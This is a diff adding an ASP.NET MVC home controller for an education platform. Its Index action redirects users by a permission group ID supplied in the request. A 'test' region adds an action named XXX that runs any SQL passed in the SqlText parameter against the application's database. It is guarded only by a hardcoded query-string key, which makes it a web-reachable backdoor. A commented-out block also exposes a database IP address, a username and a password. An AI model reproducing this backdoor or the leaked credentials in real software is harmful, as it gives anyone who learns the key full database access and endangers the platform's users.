@@ -1,0 +1,147 @@
+﻿using Dianda.AP.Model.Entrance.Home;
+using System;
+using System.Collections.Generic;
+using System.Configuration;
+using System.Data;
+using System.Data.SqlClient;
+using System.Linq;
+using System.Web;
+using System.Web.Mvc;
+using XXW.Enum;
+
+namespace Web.Areas.Entrance.Controllers
+{
+    public class HomeController : Controller
+    {
+        //首页处理
+        // GET: /Entrance/Home/
+
+        //根据权限跳转
+        public ActionResult Index()
+        {
+            Code.SiteCache cache = Code.SiteCache.Instance;
+
+            if (cache.LoginInfo == null)
+                return RedirectToAction("Index", "Login", new { area = "Entrance" });
+            else
+            {
+                int groupId = (int)PlatformGroupEnum.TeacherGeneral;//普通教师权限组Id
+                bool accept = true;
+                if (!string.IsNullOrEmpty(Request["GroupId"]))
+                {
+                    int.TryParse(Request["GroupId"], out groupId);
+                }
+
+                //判断权限是否在合法范围内
+                if (groupId != 0)
+                {
+                    foreach (var type in Enum.GetValues(typeof(PlatformGroupEnum)))
+                    {
+                        if (groupId == (int)type)
+                        {
+                            accept = true;
+                            break;
+                        }
+                        else
+                        {
+                            accept = false;
+                        }
+                    }
+                }
+                else
+                {
+                    accept = false;
+                }
+
+                PlatformGroups group;
+                if (accept)//groupId合法
+                {
+                    group = cache.PlatformGroups.FirstOrDefault(t => t.Id == groupId);
+                }
+                else//groupId不合法，设为默认权限组
+                {
+                    group = cache.PlatformGroups.FirstOrDefault();
+                }
+                //更新相关缓存
+                if (group != null)
+                {
+                    cache.GroupId = groupId;
+                    cache.ManagerId = group.ManagerId;
+                    cache.ManageOrganId = group.ManageOrganId;
+                }
+
+                //获取菜单缓存中的首个权限地址，并执行跳转
+                List<PlatformMenu> menus = cache.PlatformMenus;
+                PlatformMenu menu = menus.FirstOrDefault(t => t.MenuPath != "");
+                if (menu != null)
+                {
+                    if (groupId == (int)PlatformGroupEnum.TeacherGeneral)
+                    {
+                        return Redirect("/Learn/MyTest/Index");
+                    }
+                    else
+                    {
+                        return Redirect("/" + menu.MenuPath);
+                    }
+                }
+                else
+                {
+                    return Redirect("/SiteOption/ErrorFunction");
+                }
+            }
+        }
+
+        #region 测试
+        public ActionResult TestEx()
+        {
+            throw new Exception();
+        }
+
+        public ActionResult XXX()
+        {
+            string key = Request.QueryString["sql"] == null ? "" : Request.QueryString["sql"];
+            if (key != "qazwsx")
+            {
+                return new EmptyResult();
+            }
+            else
+            {
+                //SqlConnectionStringBuilder connstr = new SqlConnectionStringBuilder();
+                //connstr.DataSource = "202.120.199.165";
+                //connstr.InitialCatalog = "2015AbilityPromotion";
+                //connstr.UserID = "sa_read";
+                //connstr.Password = "1qaz2wsx";
+
+                string sqlText = Request["SqlText"] == null ? "" : Request["SqlText"].Trim();
+                DataSet ds = new DataSet();
+
+                if (!string.IsNullOrEmpty(sqlText))
+                {
+                    //using (SqlConnection conn = new SqlConnection(connstr.ConnectionString))
+                    using (SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings["qazwsx"].ConnectionString))
+                    {
+                        conn.Open();
+                        SqlCommand command = conn.CreateCommand();
+                        command.CommandText = sqlText;
+
+                        try
+                        {
+                            using (SqlDataAdapter sda = new SqlDataAdapter(command))
+                            {
+                                sda.Fill(ds);
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            throw e;
+                        }
+                    }
+                }
+
+                ViewBag.SqlText = sqlText;
+                return View(ds);
+            }
+        }
+        #endregion
+    }
+}
